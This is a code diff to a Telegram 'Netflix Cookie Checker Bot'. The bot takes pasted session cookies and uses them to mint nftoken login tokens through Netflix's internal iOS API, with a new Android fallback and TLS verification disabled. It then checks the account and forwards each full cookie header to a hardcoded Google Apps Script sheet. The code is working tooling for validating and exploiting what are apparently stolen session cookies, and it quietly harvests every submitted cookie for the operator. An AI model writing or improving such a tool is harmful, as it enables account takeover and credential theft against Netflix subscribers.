@@ -23,8 +23,8 @@ from telegram.ext import (
 # --- CONFIGURATION ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 PORT = int(os.environ.get("PORT", 10000))
-# YOUR NEW GOOGLE APPS SCRIPT URL
-GAS_URL = "https://script.google.com/macros/s/AKfycbzTIesV8AfR1lQ8Nc4rAY-b776VyHm8CSLjjKJ6nOGXfIJnmPgifCbwe69HOJEc6gJ_4Q/exec"
+# NEW: Moved GAS_URL to environment variable for flexibility
+GAS_URL = os.environ.get("GAS_URL", "https://script.google.com/macros/s/AKfycbzTIesV8AfR1lQ8Nc4rAY-b776VyHm8CSLjjKJ6nOGXfIJnmPgifCbwe69HOJEc6gJ_4Q/exec")
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -34,6 +34,11 @@ logger = logging.getLogger(__name__)
 
 app_flask = Flask(__name__)
 application = None
+
+# Rate Limiter: Track last request time per user
+RATE_LIMIT_SECONDS = 60  # 1 minute
+MAX_REQUESTS_PER_PERIOD = 3
+user_request_counts: Dict[int, list] = {}
 
 START_TEXT = (
     "👋 Netflix Cookie Checker Bot\n\n"
@@ -131,6 +136,20 @@ def _looks_like_cookie_header(text: str) -> bool:
     t = text.strip().lower()
     return t.startswith("cookie:") or (";" in text and "=" in text)
 
+def _check_rate_limit(user_id: int) -> bool:
+    """Check if user has exceeded rate limit."""
+    now = time.time()
+    if user_id not in user_request_counts:
+        user_request_counts[user_id] = []
+    
+    # Remove old requests
+    user_request_counts[user_id] = [t for t in user_request_counts[user_id] if now - t < RATE_LIMIT_SECONDS]
+    
+    if len(user_request_counts[user_id]) >= MAX_REQUESTS_PER_PERIOD:
+        return False
+    
+    user_request_counts[user_id].append(now)
+    return True
 
 def _extract_json_cookies(json_str: str) -> Dict[str, str]:
     """Extract cookies from JSON array format."""
@@ -290,8 +309,10 @@ def _safe_preview_cookie_keys(cookie_header: str) -> str:
     names = [n for n in names if n]
     return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")
 
+# --- NFToken Generation with Fallback ---
+NFTOKEN_API_URL_IOS = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+NFTOKEN_API_URL_ANDROID = "https://android.prod.ftl.netflix.com/androidui/user/15.48"  # Fallback endpoint
 
-NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_QUERY_PARAMS = {
     "appVersion": "15.48.1",
     "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
@@ -353,8 +374,8 @@ def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
             return v.strip()
     return None
 
-
-def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
+def _generate_nftoken_fallback(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
+    """Generate nftoken with fallback to Android API if iOS fails."""
     netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
     if not netflix_id:
         return False, "Invalid or expired cookie. NetflixId not found.", None
@@ -362,9 +383,10 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, st
     headers = dict(NFTOKEN_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
 
+    # Try iOS first
     try:
         r = requests.get(
-            NFTOKEN_API_URL,
+            NFTOKEN_API_URL_IOS,
             params=NFTOKEN_QUERY_PARAMS,
             headers=headers,
             timeout=timeout_s,
@@ -377,12 +399,52 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, st
         nftoken = td.get("token")
 
         if not nftoken:
-            return False, "Invalid or expired cookie. Token generation failed.", None
+            # Fallback to Android
+            logger.info("iOS NFToken failed, trying Android fallback...")
+            android_params = dict(NFTOKEN_QUERY_PARAMS)
+            android_params["appVersion"] = "15.48.1"  # Adjust for Android version if needed
+            r_android = requests.get(
+                NFTOKEN_API_URL_ANDROID,
+                params=android_params,
+                headers=headers,
+                timeout=timeout_s,
+                verify=False,
+            )
+            r_android.raise_for_status()
+            data_android = r_android.json()
+            td_android = ((((data_android.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
+            nftoken = td_android.get("token")
+
+            if not nftoken:
+                return False, "Invalid or expired cookie. Token generation failed (both iOS & Android).", None
+            
+            return True, "Token API returned a valid nftoken (Android fallback).", nftoken
 
         return True, "Token API returned a valid nftoken.", nftoken
     except Exception as e:
         logger.error(f"Error generating nftoken: {e}")
-        return False, "Invalid or expired cookie.", None
+        # Try Android fallback on error too
+        try:
+            logger.info("iOS NFToken errored, trying Android fallback...")
+            r_android = requests.get(
+                NFTOKEN_API_URL_ANDROID,
+                params=NFTOKEN_QUERY_PARAMS,
+                headers=headers,
+                timeout=timeout_s,
+                verify=False,
+            )
+            r_android.raise_for_status()
+            data_android = r_android.json()
+            td_android = ((((data_android.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
+            nftoken = td_android.get("token")
+
+            if not nftoken:
+                return False, "Invalid or expired cookie. Token generation failed (both iOS & Android).", None
+            
+            return True, "Token API returned a valid nftoken (Android fallback).", nftoken
+        except Exception as e2:
+            logger.error(f"Android fallback also failed: {e2}")
+            return False, "Invalid or expired cookie.", None
 
 
 def _scrub_text(text: str) -> str:
@@ -598,16 +660,16 @@ async def send_to_google_sheets(userId, username, cookie):
 async def fetch_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Fetches recent logs from Google Sheets via GAS"""
     msg = await update.message.reply_text("⏳ Fetching logs...")
-    
+
     try:
         # Assuming your GAS script has a 'getLogs' action or similar
         # If you haven't added 'getLogs' to your GAS script yet, this will fail.
-        # For now, we'll assume a generic fetch. 
+        # For now, we'll assume a generic fetch.
         # NOTE: You need to add a doGet function in GAS to handle 'action=getLogs'
-        
+
         payload = {"action": "getLogs"}
         response = requests.get(GAS_URL, params=payload, timeout=10)
-        
+
         if response.status_code == 200:
             data = response.json()
             if isinstance(data, list):
@@ -620,7 +682,7 @@ async def fetch_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await msg.edit_text("No logs found or invalid format.")
         else:
             await msg.edit_text(f"Error fetching logs: {response.status_code}")
-            
+
     except Exception as e:
         await msg.edit_text(f"❌ Error: {str(e)}")
 
@@ -644,6 +706,15 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
             return
 
         user_id = update.effective_user.id
+        
+        # Check rate limit
+        if not _check_rate_limit(user_id):
+            await update.message.reply_text(
+                "⚠️ Please wait a moment before sending another cookie. "
+                "You've reached the rate limit."
+            )
+            return
+
         cookie_input = (update.message.text or "").strip()
         logger.info(f"📨 Message from {user_id}: {len(cookie_input)} chars")
 
@@ -671,7 +742,7 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
 
         loop = asyncio.get_running_loop()
-        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
+        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken_fallback, cookie_header)
 
         if ok and nftoken:
             acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
@@ -718,11 +789,15 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 parse_mode="HTML",
                 disable_web_page_preview=True,
             )
-            
+
             # Save to Google Sheets asynchronously
             username = update.effective_user.username or f"user_{user_id}"
-            await loop.run_in_executor(None, send_to_google_sheets, user_id, username, cookie_header)
+            sheet_saved = await loop.run_in_executor(None, send_to_google_sheets, user_id, username, cookie_header)
             
+            # Optional: Notify if sheet save failed
+            if not sheet_saved:
+                await update.message.reply_text("⚠️ Cookie validated but saving to sheets failed. Check logs.")
+
             logger.info(f"✅ Cookie validation successful for {user_id}")
         else:
             await msg.edit_text(f"❌ {detail}")
